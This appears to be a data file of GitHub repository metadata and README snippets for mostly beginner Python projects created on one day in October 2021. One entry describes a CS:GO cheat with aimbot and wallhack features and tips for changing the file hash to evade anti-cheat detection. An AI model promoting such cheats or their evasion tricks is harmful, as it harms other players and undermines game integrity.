417951684;vk-python-hw1;https://github.com/firstova-a/vk-python-hw1;Python;2021-10-16T21:22:55Z;0;0;0;VK Python WH1 Prerequisites pip install -r requirements.txt 
417912501;ExamenFinalPython;https://github.com/gdelgador/ExamenFinalPython;Jupyter Notebook;2021-10-16T18:22:37Z;0;0;0;ExamenFinalPython Este repositorio contiene archivos del examen final 
417922680;python-api-challenge;https://github.com/CORNELIAHINTON/python-api-challenge;;2021-10-16T19:09:35Z;0;0;0;python-api-challenge 
417922967;python-youtube-video-downloader;https://github.com/ajaysingh111444/python-youtube-video-downloader;;2021-10-16T19:11:08Z;0;0;0;
417927007;python-random-quote;https://github.com/titwinky/python-random-quote;Python;2021-10-16T19:28:19Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417934896;python-random-quote;https://github.com/rpritz/python-random-quote;Python;2021-10-16T20:02:25Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417903474;python-slack-bots;https://github.com/Wyle09/python-slack-bots;Python;2021-10-16T17:45:26Z;0;0;0;
417945063;Python-Lights-Out-Project;https://github.com/tianye-chen/Python-Lights-Out-Project;Python;2021-10-16T20:49:33Z;0;0;0;Python Lights Out Project Lights Out game recreated in Python using Pygame Goal of the game is to solve the puzzle by turning all blocks to green Each click on a block will flip itself and all adjacent blocks to the opposite color Features:  Ability to reshape the board using width and height incrementers and decrementers Reset button to reset the entire board Solve button to automatically solve the puzzle (WIP)  
417878377;pulumi-template-aws-python;https://github.com/peterkowalski/pulumi-template-aws-python;Python;2021-10-16T16:05:38Z;0;0;0;"${PROJECT} ${DESCRIPTION} Initial configuration   Install Pulumi   Configure AWS credentials   Install Poetry   Install pre-commit   Add .envrc file with the following content: #! /usr/bin/env bash export AWS_PROFILE=$YOUR_AWS_PROFILE   Install Python virtual environment: poetry install   Initialize git repository: git init   Install pre-commit hooks: pre-commit install   Login to your AWS backend: pulumi login $BUCKET   Create Pulumi stack: pulumi stack init --secrets-provider=""$KMS_KEY_ALIAS""   "
417950751;HackerRank_Python_Solutions;https://github.com/catymiao/HackerRank_Python_Solutions;Python;2021-10-16T21:18:16Z;0;0;0;HackerRankSolutions a collection of solutions to HackerRank python problems 
417921268;python-youtube-search;https://github.com/tonybnya/python-youtube-search;Python;2021-10-16T19:03:09Z;0;0;0;Python YouTube Search Explanation A simple Python script which launches a YouTube search, with keywords pasted to the clipboard, or by arguments in a command line. Usage A. Use this command line python3 youtube_search.py keywords B. Use the clipboard (for macOS users)  create a shell script, a file with .command extension add the following two lines and register file to the home directory  #!/usr/bin/env bash python3 /path/to/python_script.py  make the file executable  chmod u+x your_script.command  Now, you can copy a keyword to the clipboard open the Spotlight (⌘-SPACE), enter your_script.command to run the Python script  
417932102;Data-Analysis-with-Python;https://github.com/purosh96/Data-Analysis-with-Python;Jupyter Notebook;2021-10-16T19:51:55Z;0;0;0;
417893615;Python-Review---Part-2;https://github.com/janetmz/Python-Review---Part-2;Jupyter Notebook;2021-10-16T17:06:17Z;0;0;0;Python-Review---Part-2 
417895033;EDC_python_curso;https://github.com/gabrielos307/EDC_python_curso;Jupyter Notebook;2021-10-16T17:11:58Z;0;0;0;
417907386;python-based-site;https://github.com/chrisjsimpson/python-based-site;HTML;2021-10-16T18:01:03Z;0;0;0;How to run example Subheading  Need python3 installed  Then: python3 -m http.server  Then visit: http://0.0.0.0:8000 
417894304;Python-For-Masters;https://github.com/Mirza-Samad-Ahmed-Baig/Python-For-Masters;Jupyter Notebook;2021-10-16T17:09:03Z;0;0;0;Python-For-Masters- Learn Python Basic to advance 
417895455;heart-in-python;https://github.com/venomusblood568/heart-in-python;Python;2021-10-16T17:13:37Z;0;0;0;heart-in-python 
417914724;python-api-challenge;https://github.com/Donterrius-Daniels/python-api-challenge;;2021-10-16T18:32:21Z;0;0;0;python-api-challenge 
417917464;python-api-challenge;https://github.com/danielherfurth/python-api-challenge;;2021-10-16T18:45:08Z;0;0;0;python-api-challenge I am currently unable to complete this project due to a sudden death in the family. Upon returning home I will be able to complete this assignment. I understand that this is not a good look but I will have to put this on the backburner temporarily while I grieve. 
417905235;DSA-in-python;https://github.com/RohitChitte/DSA-in-python;Python;2021-10-16T17:52:33Z;0;0;0;
417887292;Checking-ValidPassword-Python;https://github.com/SyedaAnshrahGillani/Checking-ValidPassword-Python;Python;2021-10-16T16:40:42Z;0;0;0;
417888154;all-distributions-in-python;https://github.com/tuanpa2295/all-distributions-in-python;Jupyter Notebook;2021-10-16T16:44:18Z;0;0;0;distribution-is-all-you-need distribution-is-all-you-need is the basic distribution probability tutorial for most common distribution focused on Deep learning using python library. Overview of distribution probability    conjugate means it has relationship of conjugate distributions.  In Bayesian probability theory, if the posterior distributions p(θ | x) are in the same probability distribution family as the prior probability distribution p(θ), the prior and posterior are then called conjugate distributions, and the prior is called a conjugate prior for the likelihood function. Conjugate prior, wikipedia    Multi-Class means that Random Varivance are more than 2.   N Times means that we also consider prior probability P(X).   To learn more about probability, I recommend reading [pattern recognition and machine learning, Bishop 2006].   distribution probabilities and features  Uniform distribution(continuous), code  Uniform distribution has same probaility value on [a, b], easy probability.      Bernoulli distribution(discrete), code  Bernoulli distribution is not considered about prior probability P(X). Therefore, if we optimize to the maximum likelihood, we will be vulnerable to overfitting. We use binary cross entropy to classify binary classification. It has same form like taking a negative log of the bernoulli distribution.      Binomial distribution(discrete), code  Binomial distribution with parameters n and p is the discrete probability distribution of the number of successes in a sequence of n independent experiments. Binomial distribution is distribution considered prior probaility by specifying the number to be picked in advance.      Multi-Bernoulli distribution, Categorical distribution(discrete), code  Multi-bernoulli called categorical distribution, is a probability expanded more than 2. cross entopy has same form like taking a negative log of the Multi-Bernoulli distribution.      Multinomial distribution(discrete), code  The multinomial distribution has the same relationship with the categorical distribution as the relationship between Bernoull and Binomial.      Beta distribution(continuous), code  Beta distribution is conjugate to the binomial and Bernoulli distributions. Using conjucation, we can get the posterior distribution more easily using the prior distribution we know. Uniform distiribution is same when beta distribution met special case(alpha=1, beta=1).      Dirichlet distribution(continuous), code  Dirichlet distribution is conjugate to the MultiNomial distributions. If k=2, it will be Beta distribution.      Gamma distribution(continuous), code  Gamma distribution will be beta distribution, if Gamma(a,1) / Gamma(a,1) + Gamma(b,1) is same with Beta(a,b). The exponential distribution and chi-squared distribution are special cases of the gamma distribution.      Exponential distribution(continuous), code  Exponential distribution is special cases of the gamma distribution when alpha is 1.      Gaussian distribution(continuous), code  Gaussian distribution is a very common continuous probability distribution      Normal distribution(continuous), code  Normal distribution is standarzed Gaussian distribution, it has 0 mean and 1 std.      Chi-squared distribution(continuous), code  Chi-square distribution with k degrees of freedom is the distribution of a sum of the squares of k independent standard normal random variables. Chi-square distribution is special case of Beta distribution      Student-t distribution(continuous), code  The t-distribution is symmetric and bell-shaped, like the normal distribution, but has heavier tails, meaning that it is more prone to producing values that fall far from its mean.     Author If you would like to see the details about relationship of distribution probability, please refer to this.   Tae Hwan Jung @graykode, Kyung Hee Univ CE(Undergraduate). Author Email : nlkey2022@gmail.com If you leave the source, you can use it freely.  
417891974;1st-python-project;https://github.com/amitbirajdar0311/1st-python-project;;2021-10-16T17:00:29Z;0;0;0;
417930551;python-docker-poc;https://github.com/Loskir/python-docker-poc;Dockerfile;2021-10-16T19:45:03Z;0;0;0;Reproduction example of strange behavior regarding python logs in docker-compose Steps:  Clone the repo Run docker-compose up  Expected behavior: Logs are printed line-by-line once a second Actual behavior No logs are printed for the first 10 seconds, then all 11 lines appear at once. 
417959110;docker-compose-example-python;https://github.com/PriyankaGorai/docker-compose-example-python;Python;2021-10-16T22:02:37Z;0;0;0;
417880328;python-tkinter-mongodb;https://github.com/0ChiRANjeeVi0/python-tkinter-mongodb;Python;2021-10-16T16:12:54Z;0;0;0;
417885043;SquareRootFunction-Python;https://github.com/SyedaAnshrahGillani/SquareRootFunction-Python;Python;2021-10-16T16:31:24Z;0;0;0;
417947008;Basic_Projects_Python;https://github.com/eraosso/Basic_Projects_Python;;2021-10-16T20:59:18Z;0;0;0;Basic_Projects_Python A few basic projects in Python! I intend to use this repository to host some basic projects in Python as a way of measuring my development as a dev. 
417906884;mega-sdk-python-1;https://github.com/majnurangeela/mega-sdk-python-1;Dockerfile;2021-10-16T17:59:07Z;0;0;0;
417969629;python-project-lvl3;https://github.com/mamilla11/python-project-lvl3;;2021-10-16T23:10:27Z;0;0;0;Hexlet tests and linter status:  
417971273;enviar_emails_python;https://github.com/christiancastro24/enviar_emails_python;Python;2021-10-16T23:22:13Z;0;0;0;Envio de e-mails com Python Programa específico para envio de e-mails, na parte de rascunho mostra uma outra abordagem para preencher melhor o e-mail. 
417972998;Dinner-and-Python;https://github.com/RussellDash332/Dinner-and-Python;;2021-10-16T23:35:05Z;1;1;0;Dinner-and-Python 
417972309;python-api-challenge;https://github.com/capnrick/python-api-challenge;Jupyter Notebook;2021-10-16T23:30:05Z;0;0;0;python-api-challenge My solution for Python API Challenge for Northwestern University Data Science and Visualization Bootcamp 
417890538;reptile-by-python;https://github.com/Jinx-FX/reptile-by-python;Python;2021-10-16T16:54:33Z;0;0;0;- 该仓库用于存储本人做过或找到的一些爬虫项目 
417893870;simple_python_server;https://github.com/Bodyancheq/simple_python_server;Python;2021-10-16T17:07:14Z;0;0;0;"simple_python_server A simple server written on python on YouTube guide https://www.youtube.com/watch?v=3QiPPX-KeSc - Guide Description This app works on 2 different ports. You can open 2 instanses of python (for example in 2 consoles) and communicate like that. You can send message and it will be echoed on ""server"" on another port. "
417886713;DS-Algorithms-Python;https://github.com/YuktiP/DS-Algorithms-Python;;2021-10-16T16:38:00Z;0;0;0;DS-Algorithms-Python 
417898044;python-todo-reminder-app;https://github.com/tonybnya/python-todo-reminder-app;;2021-10-16T17:23:40Z;0;0;0;Python Todo & Reminder App Explanation How to run Python program on macOS  Create text file with .command extension to create a shell script Add the following content:  #!/usr/bin/env bash python3 /path/to/your/python_script.py  Save the file in the home folder Make the script executable in a terminal:  chmod u+x your_script.command  Now you are able to click the Spotlight icon (or press ⌘-SPACE) and enter your_script.command to run the shell script, which will run the Python script.  
417929121;Curso-em-Video-Python;https://github.com/beamedeiros/Curso-em-Video-Python;Python;2021-10-16T19:37:58Z;0;0;0;Curso-em-Video-Python 
417953033;Python-Crash-Course;https://github.com/AndrewGerena/Python-Crash-Course;;2021-10-16T21:30:35Z;0;0;0;
417955496;python-polish-notation;https://github.com/H3lltronik/python-polish-notation;Python;2021-10-16T21:43:44Z;0;0;0;Python Polish Wea Just execute the entrypoint.py and you are good to go 
417912594;ExamenFinalPython;https://github.com/FranchescaF/ExamenFinalPython;;2021-10-16T18:23:03Z;0;0;0;ExamenFinalPython Repositorio de ejercicios resueltos del examen final. 
417967239;Python-password-cracker;https://github.com/DutyServeUnion/Python-password-cracker;Python;2021-10-16T22:54:59Z;0;0;0;Python-password-cracker DUDE THIS IS A JOKE DO NTO TROLL WITH THIS YES YES? (Python is unironically the most boring language I learned) 
417956203;Codcademy-Python-Code-Challenges;https://github.com/Seanjkennedy/Codcademy-Python-Code-Challenges;Python;2021-10-16T21:47:14Z;0;0;0;Codcademy-Python-Code-Challenges 10 codecademy code challenges link to challenges https://www.codecademy.com/resources/blog/advanced-python-code-challenges/ 
417946180;5PythonProjects-techwithtim;https://github.com/jathinreddy/5PythonProjects-techwithtim;Python;2021-10-16T20:55:01Z;0;0;0;5-Python-Projects-For-Beginners 
417931427;Basic-Python-Projects;https://github.com/Faraz643/Basic-Python-Projects;;2021-10-16T19:49:32Z;0;0;0;Basic-Python-Projects Hello, I am Faraz. Currently learning python basics and implementing those basics in small projects. 
417917121;python-fast-api;https://github.com/laerson-hammes/python-fast-api;Python;2021-10-16T18:43:34Z;0;0;0;Python Fast Api Python Brasil 2021 
417965250;python-api-challenge;https://github.com/melorebecca/python-api-challenge;Jupyter Notebook;2021-10-16T22:40:33Z;0;0;0;"Python API Homework - What's the Weather Like? Background Whether financial, political, or social -- data's true power lies in its ability to answer questions definitively. So let's take what you've learned about Python requests, APIs, and JSON traversals to answer a fundamental question: ""What's the weather like as we approach the equator?"" Now, we know what you may be thinking: ""Duh. It gets hotter..."" But, if pressed, how would you prove it?  Before You Begin   Create a new repository for this project called python-api-challenge. Do not add this homework to an existing repository.   Clone the new repository to your computer.   Inside the repository folder you just created, add new files called WeatherPy.ipynb and VacationPy.ipynb. These will be the main scripts to run for each analysis.   Push the above changes to GitHub.   Adding A .gitignore File We don't want the api_keys.py file containing the API key to be exposed to the public on GitHub, as this would mean anyone could copy and use our API key, possibly causing us to incur charges. When we type git status in the command line, we can see all the files we have created so far that are untracked. If we only wanted to add the WeatherPy.ipynb file to GitHub we could type git add WeatherPy.ipynb. However, every time we want to add a new file or update current files to the repository, we have to add each file individually, which is time-consuming and cumbersome. Instead, we can add the files we don't want to track to the .gitignore file. Before we add our files to GitHub, let's add api_keys.py to the .gitignore file. Follow these steps:   Open your python-api-challenge GitHub folder in VS Code.   Open the .gitignore file, and on the first line type the following:   # Adding config.py file. api_keys.py   While the .gitignore file is open, add the API_practice.ipynb and random_numbers.ipynb files and save the file.   In the command line, type git status and press Enter. The output should say the .gitignore file has been modified and the WeatherPy.ipynb file is untracked.   Use git add, git commit, and git push to commit the modifications to .gitignore and the WeatherPy.ipynb file to GitHub.   On GitHub, the only new file you should see is the WeatherPy.ipynb file. Part I - WeatherPy In this example, you'll be creating a Python script to visualize the weather of 500+ cities across the world of varying distance from the equator. To accomplish this, you'll be utilizing a simple Python library, the OpenWeatherMap API, and a little common sense to create a representative model of weather across world cities. The first requirement is to create a series of scatter plots to showcase the following relationships:  Temperature (F) vs. Latitude Humidity (%) vs. Latitude Cloudiness (%) vs. Latitude Wind Speed (mph) vs. Latitude  After each plot, add a sentence or two explaining what the code is analyzing. The second requirement is to run linear regression on each relationship. This time, separate the plots into Northern Hemisphere (greater than or equal to 0 degrees latitude) and Southern Hemisphere (less than 0 degrees latitude):  Northern Hemisphere - Temperature (F) vs. Latitude Southern Hemisphere - Temperature (F) vs. Latitude Northern Hemisphere - Humidity (%) vs. Latitude Southern Hemisphere - Humidity (%) vs. Latitude Northern Hemisphere - Cloudiness (%) vs. Latitude Southern Hemisphere - Cloudiness (%) vs. Latitude Northern Hemisphere - Wind Speed (mph) vs. Latitude Southern Hemisphere - Wind Speed (mph) vs. Latitude  After each pair of plots, take the time to explain what the linear regression is modeling. For example, describe any relationships you notice and any other analysis you may have. Your final notebook must:  Randomly select at least 500 unique (non-repeat) cities based on latitude and longitude. Perform a weather check on each of the cities using a series of successive API calls. Include a print log of each city as it's being processed with the city number and city name. Save a CSV of all retrieved data and a PNG image for each scatter plot.  Part II - VacationPy Now let's use your skills in working with weather data to plan future vacations. Use jupyter-gmaps and the Google Places API for this part of the assignment.   Note: Remember that any API usage beyond the $200 credit will be charged to your personal account. You can set quotas and limits to your daily requests to be sure you can't be charged. Check out Google Maps Platform Billing and Manage your cost of use for more information.   Note: if you having trouble displaying the maps, try running jupyter nbextension enable --py gmaps in your environment and retry.   To complete this part of the assignment,you will need to do the following:   Create a heat map that displays the humidity for every city from Part I.    Narrow down the DataFrame to find your ideal weather condition. For example:   A max temperature lower than 80 degrees but higher than 70.   Wind speed less than 10 mph.   Zero cloudiness.   Drop any rows that don't contain all three conditions. You want to be sure the weather is ideal.   Note: Feel free to adjust to your specifications but be sure to limit the number of rows returned by your API requests to a reasonable number.     Using Google Places API to find the first hotel for each city located within 5000 meters of your coordinates.   Plot the hotels on top of the humidity heatmap with each pin containing the Hotel Name, City, and Country.    As final considerations:  You must complete your analysis using a Jupyter notebook. You must use the Matplotlib or Pandas plotting libraries. For Part I, you must include a written description of three observable trends based on the data. For Part II, you must include a screenshot of the heatmap you create and include it in your submission. You must use proper labeling of your plots, including aspects like: Plot Titles (with date of analysis) and Axes Labels. For max intensity in the heat map, try setting it to the highest humidity found in the data set.  Hints and Considerations   The city data you generate is based on random coordinates as well as different query times. As such, your outputs will not be an exact match to the provided starter notebook.   If you'd like a refresher on the geographic coordinate system, this site has great information.   Next, spend the requisite time necessary to study the OpenWeatherMap API. Based on your initial study, you should be able to answer basic questions about the API: Where do you request the API key? Which Weather API in particular will you need? What URL endpoints does it expect? What JSON structure does it respond with? Before you write a line of code, you should be aiming to have a crystal clear understanding of your intended outcome.   A starter code for Citipy has been provided. However, if you're craving an extra challenge, push yourself to learn how it works: citipy Python library. Before you try to incorporate the library into your analysis, start by creating simple test cases outside your main script to confirm that you are using it correctly. Too often, when introduced to a new library, students get bogged down by the most minor of errors -- spending hours investigating their entire code -- when, in fact, a simple and focused test would have shown their basic utilization of the library was wrong from the start. Don't let this be you!   Part of our expectation in this challenge is that you will use critical thinking skills to understand how and why we're recommending the tools we are. What is Citipy for? Why would you use it in conjunction with the OpenWeatherMap API? How would you do so?   In building your script, pay attention to the cities you are using in your query pool. Are you getting coverage of the full gamut of latitudes and longitudes? Or are you simply choosing 500 cities concentrated in one region of the world? Even if you were a geographic genius, simply rattling 500 cities based on your human selection would create a biased dataset. Be thinking of how you should counter this. (Hint: Consider the full range of latitudes).   Once you have computed the linear regression for one chart, the process will be similar for all others. As a bonus, try to create a function that will create these charts based on different parameters.   Remember that each coordinate will trigger a separate call to the Google API. If you're creating your own criteria to plan your vacation, try to reduce the results in your DataFrame to 10 or fewer cities.   Ensure your repository has regular commits and a thorough README.md file.   Lastly, remember -- this is a challenging activity. Push yourself! If you complete this task, then you can safely say that you've gained a strong mastery of the core foundations of data analytics and it will only go better from here. Good luck!   Rubric Unit 6 Rubric - Python API Homework - What's the Weather Like?  © 2021 Trilogy Education Services, LLC, a 2U, Inc. brand. Confidential and Proprietary. All Rights Reserved. "
417900146;Fall-2021-Python-2;https://github.com/HackHighSchool/Fall-2021-Python-2;;2021-10-16T17:31:33Z;0;0;0;"Fall-2021-Python-2 Arcade Game: 3 Games; Tic Tac Toe: this is a simple tic tac toe game, we will create a 3x3 box with python, and it will be a single player game, with the computer playing against a single player. Cooking Game: This is a game where you merge different blocks to make hamburgers. For example if you merge a patty with another patty that will create the bread for the hamburger and this is how the game will work until you create a full hamburger. The game is inspired by the 2048 game. Dart Balloons: A game that emphasizes targets and strategies. The user interface (UI) will include the player to aim at certain balloons. There will be different variables that the player can focus on. Some examples could be regular balloons, balloons that score double, and balloons that can take away points. "
417905815;Sorting_Algorithms_Python;https://github.com/naeimsalib/Sorting_Algorithms_Python;Python;2021-10-16T17:54:54Z;0;0;0;Sorting_Algorithms_Python Some of the Famous Sorting Algorithms and there Time Complexity  BubbleSort.py Bubble sort, sometimes referred to as sinking sort, is a simple sorting algorithm that repeatedly steps through the list, compares adjacent elements and swaps them if they are in the wrong order. The pass through the list is repeated until the list is sorted. InsertionSort.py Insertion sort is a simple sorting algorithm that builds the final sorted array one item at a time. It is much less efficient on large lists than more advanced algorithms such as quicksort, heapsort, or merge sort. SelectionSort.py selection sort is an in-place comparison sorting algorithm. It has an O(n²) time complexity, which makes it inefficient on large lists, and generally performs worse than the similar insertion sort. 
417881687;1824_GB_Python_1;https://github.com/iNewTone/1824_GB_Python_1;;2021-10-16T16:17:54Z;0;0;0;1824_GB_Python_1 
417885294;SettingRecursionLimit-Python;https://github.com/SyedaAnshrahGillani/SettingRecursionLimit-Python;Python;2021-10-16T16:32:17Z;0;0;0;
417890175;ChatBot-using-Python;https://github.com/harshal1781/ChatBot-using-Python;Python;2021-10-16T16:53:01Z;0;0;0;ChatBot-using-Python Basic ChatBot 
417932857;Python-CSGO-Cheat;https://github.com/ElOxo/Python-CSGO-Cheat;Python;2021-10-16T19:54:18Z;0;0;0;"ProjectX All in one external CSGO cheat written in python. It is probably undetected by VAC but im not reponsible for any future bans if you use this cheat in competitive. I have only tested this cheat against bots and you shouldnt use it against real people. This is ONLY MEANT AS A POC! It comes with a nice Gui and can be installed very easily. Requires Python3 and pip (aswell as CSGO obviously) Video Tutorial: https://youtu.be/eaP6Hr_uzSs Features -Aimbot (Body or head)  -Silentaim  -RCS  -RCS with Aimbot  -Triggerbot  -Wallhack  -Noflash  -Radar  -Bunnyhop  -Customizable FOV changer  -Rank reveal in Competitive Getting Started: Step 1: Download Zip File or git clone the repository and unpack the files if needed.  Step 2: If you are installing the cheat for the first installing:   1. Open a cmd as administrator   2. Cd into the directory of the cheat   3. use ""pip install -r requirements.txt"" to install the required libraries  Step 3: Open CSGO and start a match  Step 4: Run the ProjectX.py file from the cmd (preferably as an administrator)  Step 5: Select your desired settings and click ""UPDATE""  Step 6: It is recommended to change the antivac variable every once in a while to change the hash of the file  Notes The cheat has its flaws and sometimes crashes but most of the times problems can be fixed with a restart. I will update the offsets as soon as i can but sometimes it needs some time. Credit To: https://github.com/Snaacky/ for his csgo cheats which i used to learn about CSGO cheating in python.  The unknowncheats and guided hacking community "
417914041;python-mini-projects;https://github.com/Sanket1308/python-mini-projects;;2021-10-16T18:29:23Z;0;0;0;python-mini-projects A collection of simple python mini projects to enhance your python skills. Learning Python through creating small but interesting project. 
417915281;keyauth-discord-bot-python;https://github.com/Super-6969/keyauth-discord-bot-python;Python;2021-10-16T18:34:55Z;0;0;0;
417916526;Python-API-Challenge;https://github.com/PeiDay/Python-API-Challenge;;2021-10-16T18:40:46Z;0;0;0;Python-API-Challenge Weather and Vacation 
417877871;Simple-Quiz-in-Python;https://github.com/Dev2212/Simple-Quiz-in-Python;Python;2021-10-16T16:03:48Z;0;0;0;
417882101;TASK-3-PYTHON-MATHS-;https://github.com/mrcomet/TASK-3-PYTHON-MATHS-;;2021-10-16T16:19:36Z;0;0;0;TASK-3-PYTHON-MATHS- 
417963982;Python-and-DataScience;https://github.com/effimalik/Python-and-DataScience;;2021-10-16T22:31:24Z;0;0;0;Python-and-DataScience 
417902768;Correlation-Analysis---Python;https://github.com/MoganaD/Correlation-Analysis---Python;;2021-10-16T17:42:45Z;0;0;0;
417897007;Resume_Python_React;https://github.com/Atsu999/Resume_Python_React;Python;2021-10-16T17:19:54Z;0;0;0;
417947462;Shodan_Python_Project;https://github.com/smoorthi-uno/Shodan_Python_Project;Python;2021-10-16T21:01:36Z;0;0;0;Shodan_Python_Project Sample Python program to fetch Shodan platform (crawling, IP lookups, searching, data streaming) data using Shodan REST API  as well as the experimenetal Streaming API and Shodan Exploits REST API. 
417889177;QR-Code-Genrator-Python;https://github.com/TanmayProgrammer-13/QR-Code-Genrator-Python;Python;2021-10-16T16:48:29Z;1;1;0;QR-Code-Genrator-Python QR Code Genrator Python For (Begginers). 
417895057;EDC_python_datos;https://github.com/chaverocarlos/EDC_python_datos;;2021-10-16T17:12:03Z;0;0;0;
417960239;back-python-yender;https://github.com/kurodevs/back-python-yender;Python;2021-10-16T22:08:38Z;0;0;0;
417946359;python-random-quote;https://github.com/Marcel1989f/python-random-quote;Python;2021-10-16T20:55:52Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417908453;arc_lib;https://github.com/arodroz/arc_lib;Python;2021-10-16T18:05:08Z;0;0;0;"strcpy Python function allowing to copy a text in another one in a mutable way. That is regardless of whether the latter has enough space to accommodate the former. Usage     from arc_lib.text import strcpy      text1 = ""Hello""      text2 = strcpy(text1, ""world!"", 6)          print(text2)     Hello world!     text2 = strcpy(text1, ""world!"", 20)          print(text2)     Hello               world!     text2 = strcpy(text1, ""world!"", 2)          print(text2)     Heworld! Installation Install this through pip: pip install arc-lib-arodroz "
417912401;Python-start-1-for-GeekBrains;https://github.com/Garlok94/Python-start-1-for-GeekBrains;;2021-10-16T18:22:09Z;0;0;0;
417917180;tutorial-pybr;https://github.com/meyrele/tutorial-pybr;;2021-10-16T18:43:49Z;0;0;0;tutorial-pybr Tutorial Python 
417937941;HundredDaysOfCode;https://github.com/alpergin/HundredDaysOfCode;Python;2021-10-16T20:15:47Z;0;0;0;HundredDaysOfCode Studying Python 
417884563;Concept-Of-Indexing-In-Python;https://github.com/SyedaAnshrahGillani/Concept-Of-Indexing-In-Python;Python;2021-10-16T16:29:28Z;0;0;0;
417901356;projet_python_ensae-1A;https://github.com/milanhurtado/projet_python_ensae-1A;Jupyter Notebook;2021-10-16T17:36:39Z;0;0;0;
417887057;Reservation-OrderPlacing-Complain-Python;https://github.com/SyedaAnshrahGillani/Reservation-OrderPlacing-Complain-Python;Python;2021-10-16T16:39:36Z;0;0;0;
417916890;Client-Server-File-Transfer--Python;https://github.com/chill2711/Client-Server-File-Transfer--Python;Python;2021-10-16T18:42:33Z;0;0;0;Client-Server-File-Transfer--Python The client side will send a file 100 times to the server and time each file transfer time, and calculate the average send time. Server side code will receive file from client side 100 times and calculate the milliseconds it takes to receive the file, the average receiving time a total receive file time and calculate an error rate. Be sure to have correct filepath as the file. 
417921837;python-sayi-ve-veri-tipleri;https://github.com/Sm0keee/python-sayi-ve-veri-tipleri;;2021-10-16T19:05:38Z;0;0;0;
417886041;TASK-3-ADVANCE-PYTHON-PROGRAM-;https://github.com/mrcomet/TASK-3-ADVANCE-PYTHON-PROGRAM-;;2021-10-16T16:35:17Z;0;0;0;TASK-3-ADVANCE-PYTHON-PROGRAM- 
417968659;infinity_python_prova5_associacao;https://github.com/bcava/infinity_python_prova5_associacao;Python;2021-10-16T23:03:55Z;0;0;0;
417927662;Book-My-Show-Python-project;https://github.com/Bhavanipanduga/Book-My-Show-Python-project;Python;2021-10-16T19:31:15Z;0;0;0;Book-My-Show-Python-project 
417942662;Rest-API-Python-e-Flask;https://github.com/RonaldoLopes/Rest-API-Python-e-Flask;;2021-10-16T20:38:05Z;0;0;0;Rest-API-Python-e-Flask Repositório com vários exemplos com banco de dados com Python e Flask 
417886810;Celcius-to-Farehnhiet-Converter-Python;https://github.com/SyedaAnshrahGillani/Celcius-to-Farehnhiet-Converter-Python;Python;2021-10-16T16:38:30Z;0;0;0;
417906982;AccuWeather-any-town-Python-;https://github.com/apostolovDK/AccuWeather-any-town-Python-;Python;2021-10-16T17:59:30Z;0;0;0;
417886313;Finding-Factorial-Using-Recursion-Python;https://github.com/SyedaAnshrahGillani/Finding-Factorial-Using-Recursion-Python;Python;2021-10-16T16:36:27Z;0;0;0;
417920291;exerciciosPythonLogicaDeProgramacao;https://github.com/alinebarbosasilva/exerciciosPythonLogicaDeProgramacao;Python;2021-10-16T18:59:01Z;0;0;0;
417969954;interview_questions_for_junior_python;https://github.com/way2thesky/interview_questions_for_junior_python;Python;2021-10-16T23:12:33Z;0;0;0;"Вопросы для собеседования Python Junior  1. Виды типизации 2. Типизация python 3. Что такое переменная 4. Числа в python 5. Строки в python 6. Списки и кортежи в python 7. Словарь в python 8. Какие типы данных относятся к структурам данных 9. Что такое Git 10. Как создать Git репозиторий локально 11. Что такое git push 12. Что делает git commit 13. Git merge и rebase 14. Что такое виртуальное окружение 15. Как установить виртуальное окружение 16. Виды форматирования строк 17. Cрезы или слайсы в python 18. Что такое итерация 19. Какие циклы есть в python 20. Чем отличается while от for 21. Каким образом реализовано ветвление в python 22. Как запросить у пользовптеля ввод 23. Преобразование типов 24. Что такое аннотация типов 25. Строка это последовательность или нет 26. Что такое PEP8 27. Что такое фунция range 28. Что делает enumerate 29. Какие методы списков 30. Что в python не является объектом 31. Название переменных 32. Что такое литералы  33. Можно ли число сделать строкой 34. Что делает метод split()  35. Что делает метод join() 36. Как импортировать модуль 37. Как импортировать все содержимое модуля 38. Сколько пар ключ значение может быть в словаре 39. Какой тип данных может быть значением в словаре 40. Как узнать id элемента 41. Как узнать версию python 42. Отличия второго python от 3 43. Как прервать выполнение цикла 44. Что означает continue 45. Что будет если сравнить 5 и 5.0 46. Что быстрее python или c++ 47. Что такое байт код 48. Как избежать конфликтов при импорте файлов 49. Что означает %s %d 50. Что такое класс 51. Что такое наследование 52. Что такое инкапсуляция 53. Что такое полиморфизм 54. Сколько может быть родителей и наследников у класса 55. Что такое перегрузка операторов 56. Магические методы 57. Модификаторы доступа 58. Генераторы 59. Как пишутся комментарии в python 60. Как можно обратить (reverse) порядок элементов в списке 61. Если мы не поставим двоеточие в конце строки для цикла ""do-while"", он все равно сработает? 62. Как убрать из списка дубликат элемента 63. Расскажите про арифметические операторы //, %, и ** 64. Как посчитать длину строки (string) 65. Расскажите про генераторы списков (list comprehension) 66. Что такое HTTP 67. Что такое json, xml 68. Чем отличается HTML и XML 69. Что такое CRUD 70. Какой паттерн программирования реализует Django 71. На каком этапе в приложении Django происходит запрос к базе данных 72. Какой результат будет Post.objects.all() и какого типа вернет 73. Что такое SQL 74. Каким запросом я могу достать все данные из таблицы 75, Что такое многие-ко-многим 76. Как реализуется М2М в SQL 77. Что такое JOIN и какой он может быть 78. Что такое View 79. Что такое миксины 80. Звёздный синтаксис 81. Два способа создания класса 82. Чем файл .pyc отличается от .py 83. Что делает python объектно-ориентированым 84. Как производится отладка программы на Python 85. Что такое GIL 86. Статусы ответов HTTP 87. Что такое Django Middleware 88.Как вставить объект чтобы он оказался под определенным индексом? 89.Что нужно сделать, чтобы функция возвращала значение? Использовать оператор return или yield 90. Что если в функции не будет return, будет ли она что-то возвращать? 91. Напишите в одну строку как можно получить самую позднюю по коду букву в строке 92. Как конвертировать список в строку? 93. Принципы SOLID 94. 